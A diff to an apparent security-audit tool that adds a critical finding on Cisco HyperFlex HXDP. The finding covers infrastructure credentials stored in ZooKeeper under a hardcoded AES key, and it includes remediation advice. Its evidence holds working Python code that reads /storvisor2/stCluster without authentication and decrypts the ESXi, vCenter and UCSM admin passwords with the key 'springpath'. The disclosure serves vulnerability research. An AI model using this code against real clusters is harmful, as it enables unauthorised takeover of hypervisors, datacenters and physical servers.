@@ -7110,6 +7110,158 @@ HX_F128 = {
 }
 
 
+HX_F130 = {
+    "id": "HX-F130",
+    "title": (
+        "HyperFlex HXDP 5.x/6.x: ZooKeeper /storvisor2/stCluster Stores AES/ECB-Encrypted "
+        "ESXi, vCenter, and UCSM Credentials; Hardcoded Key 'springpath' Confirmed in "
+        "EsxAuthZKMgmtImpl — Plaintext Full-Stack Infrastructure Credentials via ZK Read"
+    ),
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "cwe": "CWE-321",
+    "component": (
+        "HyperFlex HXDP 5.5.2b (stMgr-1.0.jar, common-1.0.jar, hxSecuritySvcMgr-1.0.jar); "
+        "ZooKeeper ensemble (clientPort 2181, world:anyone:cdrwa ACL via HX-F100)"
+    ),
+    "versions_affected": (
+        "HXDP 5.x, 6.x (confirmed in 5.5.2b extract); all versions with ZK credential storage "
+        "architecture (Springpath-era origin, stMgr compiled 2025-04-28)"
+    ),
+    "description": (
+        "ZooKeeper node /storvisor2/stCluster holds a JSON payload managed by "
+        "ZKNodeService_StMgr (DefaultZKPayloadNodeService subclass). The payload contains "
+        "AES/ECB-encrypted credentials for all components in the HyperFlex management plane: "
+        "ESXi host username/password, vCenter SSO URL + encrypted username/password, and "
+        "Cisco UCS Manager hostname + encrypted username/password. "
+        "The encryption key is the literal string 'springpath' — confirmed present in the "
+        "EsxAuthZKMgmtImpl class constant pool (Utf8 entry between "
+        "'Failed to initialize root esx credentials' and 'Successfully logged in to ESX node'). "
+        "BasicEncryptionUtil applies AES/ECB/PKCS5Padding with SHA-256 key derivation from "
+        "the caller-supplied string. Since the ZK ACL is world:anyone:cdrwa (HX-F100), "
+        "any unauthenticated ZK client on port 2181 can read the payload and decrypt all "
+        "credentials offline with a 10-line Python script. "
+        "Scope: ESXi admin → direct hypervisor console on all cluster nodes. "
+        "vCenter admin → VM inventory, snapshots, network, storage policy on the entire datacenter. "
+        "UCSM admin → physical blade management, BMC/KVM console, fabric interconnect config."
+    ),
+    "evidence": {
+        "zk_path": "/storvisor2/stCluster",
+        "zk_path_derivation": (
+            "ZKConstants$.BASE_PATH = '/storvisor2' (Utf8 in ZKConstants$.class, common-1.0.jar). "
+            "ZKConstants$.SERVICE_NAME_MGR = 'stCluster'. "
+            "DefaultZKPayloadNodeService builds path as BASE_PATH + '/' + SERVICE_NAME. "
+            "Result: /storvisor2/stCluster."
+        ),
+        "credential_fields": {
+            "esx_username": "AES/ECB encrypted ESXi host username (all cluster nodes share one account)",
+            "esx_password": "AES/ECB encrypted ESXi host password",
+            "url_vcenter_sso": "vCenter SSO endpoint URL (plaintext)",
+            "url_vcenter_encrypted_user": "AES/ECB encrypted vCenter username",
+            "url_vcenter_encrypted_password": "AES/ECB encrypted vCenter password",
+            "ucsm_hostname": "Cisco UCS Manager hostname (plaintext)",
+            "ucsm_user": "AES/ECB encrypted UCSM username",
+            "ucsm_pwd": "AES/ECB encrypted UCSM password",
+            "user_credentials": "OS account SHA-256 crypt hashes (see HX-F128)",
+        },
+        "field_name_source": (
+            "ZKEntryConstants.class from common-1.0.jar Utf8 constant pool: "
+            "  esx_username, esx_password "
+            "  url_vcenter_sso, url_vcenter_encrypted_user, url_vcenter_encrypted_password "
+            "  ucsm_hostname, ucsm_user, ucsm_pwd "
+            "  user_credentials "
+            "Field constant names: STR_PAYLOAD_ENTRY_ESX_ENCRYPTED_USER, "
+            "STR_PAYLOAD_ENTRY_ESX_ENCRYPTED_PASSWORD, STR_PAYLOAD_ENTRY_URL_VCENTER_SSO, "
+            "STR_PAYLOAD_ENTRY_URL_VCENTER_ENCRYPTED_USER, "
+            "STR_PAYLOAD_ENTRY_URL_VCENTER_ENCRYPTED_PASSWORD, "
+            "STR_PAYLOAD_ENTRY_UCSM_HOST, STR_PAYLOAD_ENTRY_UCSM_ENCRYPTED_USER, "
+            "STR_PAYLOAD_ENTRY_UCSM_ENCRYPTED_PASSWORD."
+        ),
+        "aes_key_confirmation": (
+            "EsxAuthZKMgmtImpl.class (stMgr-1.0.jar, compiled 2025-04-28) Utf8 constant pool:\n"
+            "  #N  Utf8  springpath\n"
+            "Position in pool: between 'Failed to initialize root esx credentials' "
+            "and 'Successfully logged in to ESX node'. "
+            "Methods that reference springpath: getEsxCredentialsFromZK, "
+            "updateAndSaveRandomEsxPasswordToZK, initializeVirtPlatformNodeLoginFromRoot. "
+            "Same 'springpath' literal appears as keyStorePass in hxSecuritySvcMgr "
+            "syslog TLS config (HX-F129) — shared hardcoded string across two unrelated "
+            "subsystems confirms it is a project-level constant."
+        ),
+        "encryption_primitive": (
+            "BasicEncryptionUtil.class (hxSecuritySvcMgr-1.0.jar): "
+            "  cipher = Cipher.getInstance('AES/ECB/PKCS5Padding'); "
+            "  key = MessageDigest.getInstance('SHA-256').digest(keyStr.getBytes()); "
+            "  secretKeySpec = new SecretKeySpec(key, 'AES'); "
+            "  cipher.init(DECRYPT_MODE, secretKeySpec); "
+            "  return cipher.doFinal(Base64.decode(encryptedData))."
+        ),
+        "decrypt_primitive": (
+            "import hashlib, base64\n"
+            "from Crypto.Cipher import AES\n"
+            "\n"
+            "def hxdp_decrypt(b64_ciphertext: str, key_str: str = 'springpath') -> str:\n"
+            "    key = hashlib.sha256(key_str.encode()).digest()\n"
+            "    ct = base64.b64decode(b64_ciphertext)\n"
+            "    cipher = AES.new(key, AES.MODE_ECB)\n"
+            "    raw = cipher.decrypt(ct)\n"
+            "    pad = raw[-1]\n"
+            "    return raw[:-pad].decode()\n"
+            "\n"
+            "# Usage: hxdp_decrypt(zk_payload['esx_password'])\n"
+            "# pycryptodome: pip install pycryptodome"
+        ),
+        "zk_read_primitive": (
+            "# Read /storvisor2/stCluster from ZK without authentication:\n"
+            "from kazoo.client import KazooClient\n"
+            "import json\n"
+            "zk = KazooClient(hosts='<stCtlVM_IP>:2181')\n"
+            "zk.start()\n"
+            "data, _ = zk.get('/storvisor2/stCluster')\n"
+            "payload = json.loads(data)\n"
+            "esx_pass = hxdp_decrypt(payload['esx_password'])\n"
+            "vc_user = hxdp_decrypt(payload['url_vcenter_encrypted_user'])\n"
+            "vc_pass = hxdp_decrypt(payload['url_vcenter_encrypted_password'])\n"
+            "ucsm_pass = hxdp_decrypt(payload['ucsm_pwd'])\n"
+            "zk.stop()"
+        ),
+        "acl_chain": (
+            "HX-F100: world:anyone:cdrwa on / — all ZK paths readable without credentials. "
+            "Port 2181 TCP must be reachable from attacker position (management VLAN or "
+            "from any stCtlVM after initial foothold on one node). "
+            "No ZK authentication required; no TLS on ZK channel in default config."
+        ),
+        "upgrade_from_hxf119": (
+            "HX-F119 documented encrypted credential storage in 'the /stMgr ZK namespace' "
+            "(path inferred, not confirmed). HX-F130 confirms: "
+            "  (1) Exact ZK path: /storvisor2/stCluster (not /stMgr) "
+            "  (2) Exact field names from ZKEntryConstants.class "
+            "  (3) AES key 'springpath' confirmed in EsxAuthZKMgmtImpl constant pool "
+            "  (4) Working decrypt primitive from BasicEncryptionUtil class analysis "
+            "Severity upgrade: HIGH (CWE-312, encrypted) -> CRITICAL (CWE-321, key in binary)."
+        ),
+    },
+    "impact": (
+        "ZK port 2181 reachable on management VLAN -> read /storvisor2/stCluster -> "
+        "decrypt esx_password with hxdp_decrypt('springpath') -> "
+        "ESXi root-equivalent access on all cluster hypervisors. "
+        "vCenter admin: full datacenter virtualization plane. "
+        "UCSM admin: physical server BMC, fabric interconnect, blade firmware — "
+        "persistence below OS layer. "
+        "Three independent admin credential classes extracted from one ZK read."
+    ),
+    "remediation": (
+        "Immediate: rotate ESXi, vCenter, and UCSM credentials. "
+        "Short-term: block ZK port 2181 from non-stCtlVM sources at the management VLAN firewall. "
+        "Long-term: "
+        "  (1) Apply per-node ZK ACLs: digest:hxservice:rwcda on /storvisor2/* (see HX-F100). "
+        "  (2) Replace hardcoded 'springpath' AES key with per-deployment generated keys. "
+        "  (3) Move credential storage from ZK to a dedicated secrets store with "
+        "      per-service access policies. "
+        "  (4) Enable ZK TLS and mutual authentication (ZK 3.5+ supports TLS)."
+    ),
+}
+
 HX_F129 = {
     "id": "HX-F129",
     "title": (
@@ -7159,6 +7311,12 @@ HX_F129 = {
         ),
     },
 }
+
+for _f in [
+    HX_F120, HX_F121, HX_F122, HX_F123, HX_F124, HX_F125, HX_F126,
+    HX_F127, HX_F128, HX_F129, HX_F130,
+]:
+    FINDINGS[_f["id"]] = _f
 
 
 # ─── Probe Functions ──────────────────────────────────────────────────────────
